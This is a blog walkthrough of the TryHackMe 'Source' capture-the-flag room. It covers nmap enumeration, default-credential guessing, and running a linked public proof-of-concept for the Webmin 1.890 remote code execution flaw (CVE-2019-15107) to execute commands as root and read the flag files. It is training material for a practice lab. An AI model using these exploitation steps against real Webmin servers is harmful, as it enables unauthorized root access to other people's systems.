---
title: "TryHackMe: Source"
author: cilgin
date: 2025-06-21 19:48:40 +0300
categories: [CyberSecurity]
tags: [CTF, TryHackMe, Easy]
pin: false
math: false
mermaid: false
image:
  path: /assets/img/2025-06-21-TryHackMe-Source/Source.webp
---

Howdy, fellow hackers! Welcome to my write-up for the [Source](https://tryhackme.com/room/source) room on TryHackMe. In this post, I'll walk you through the steps I took to pwn this box and grab those sweet, sweet flags. Let's get started!

# Enumeration

## Nmap Scan

First things first, let's make our lives a little easier. I'm exporting the target IP to an environment variable so I don't have to type it a million times.

```bash
export IP=10.10.178.7
```

With our variable set, it's time to unleash `nmap`:

```bash
❯ nmap -T4 -n -sC -sV -Pn -p- $IP
Starting Nmap 7.97 ( https://nmap.org ) at 2025-06-21 19:50 +0300
Nmap scan report for 10.10.178.7
Host is up (0.073s latency).
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 b7:4c:d0:bd:e2:7b:1b:15:72:27:64:56:29:15:ea:23 (RSA)
|   256 b7:85:23:11:4f:44:fa:22:00:8e:40:77:5e:cf:28:7c (ECDSA)
|_  256 a9:fe:4b:82:bf:89:34:59:36:5b:ec:da:c2:d3:95:ce (ED25519)
10000/tcp open  http    MiniServ 1.890 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-server-header: MiniServ/1.890
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 80.66 seconds
```

Our scan reveals an open door on port `10000`, where Webmin is hosting a party. Let's see if we can crash it with a quick `curl`.

```bash
❯ curl http://$IP:10000
<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-178-7.eu-west-1.compute.internal:10000/'>https://ip-10-10-178-7.eu-west-1.compute.internal:10000/</a> instead.<br></p>
```

Whoops, it seems the server is a bit shy and insists on using HTTPS. Fair enough! Let's try that instead.

```bash
❯ curl https://$IP:10000
curl: (60) SSL certificate problem: self-signed certificate
More details here: https://curl.se/docs/sslcerts.html

curl failed to verify the legitimacy of the server and therefore could not
establish a secure connection to it. To learn more about this situation and
how to fix it, please visit the webpage mentioned above.
```

Ah, the classic self-signed certificate! `curl` is being a stickler for security and refuses to connect. No worries, it's time to fire up the good old web browser, which is a lot more forgiving about these things. I pointed my browser to `https://$IP:10000` and was greeted by the Webmin login page.

![Desktop View](/assets/img/2025-06-21-TryHackMe-Source/photo1.webp){: width="665" height="645" }

## Trying to Log In (or Not)

Time for the 'ole college try' with the most creative credentials known to humankind:

- `admin:admin`
- `admin:password`

Shocker, those didn't work. On to Plan B: asking the all-knowing Google for the default password for `webmin`.

Someone on the forums said this:

```text
The default user name and password is that of your root user.
```

Interesting! But before trying to brute-force the root password, let's check the version we're dealing with. Our Nmap scan already gave us a huge clue:

```text
|_http-server-header: MiniServ/1.890
```

A quick Google search for `Webmin 1.890 exploit` hits the jackpot! Not only is there a nasty remote code execution vulnerability (CVE-2019-15107), but some kind soul has already written a proof-of-concept script. You love to see it! Here's the [GitHub repo for the exploit](https://github.com/n0obit4/Webmin_1.890-POC/blob/master/Webmin_exploit.py).

Let's run the script with the `id` command to check our privileges.

```bash
❯ python script.py -host $IP -port 10000 -cmd id

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
uid=0(root) gid=0(root) groups=0(root)
```

And just like that... `uid=0(root)`. We're in! We have achieved total control without even needing a password. The power!

## Gaining Flags

Now for the fun part: collecting our trophies!

### User Flag

Let's start by listing the contents of the `/home` directory to find our user.

```bash
❯ python script.py -host $IP -port 10000 -cmd "ls /home"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
dark
```

Okay, the user is `dark`. Let's see what's in their home directory.

```bash
❯ python script.py -host $IP -port 10000 -cmd "ls /home/dark"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
user.txt
webmin_1.890_all.deb
```

There it is, `user.txt`. Let's read it!

```bash
❯ python script.py -host $IP -port 10000 -cmd "cat /home/dark/user.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
THM{*******************}
```

### Root Flag

This one should be even easier since we're already root.

```bash
❯ python script.py -host $IP -port 10000 -cmd "cat /root/root.txt"

╦ ╦┌─┐┌┐ ┌┬┐┬┌┐┌
║║║├┤ ├┴┐│││││││
╚╩╝└─┘└─┘┴ ┴┴┘└┘ 1.890 expired Remote Root

			By: n0obit4
			Github: https://github.com/n0obit4
Your password has expired, and a new one must be chosen.
THM{*******************}
```

And that's a wrap! Two flags, one simple exploit. Thank you for reading my write-up, and happy hacking
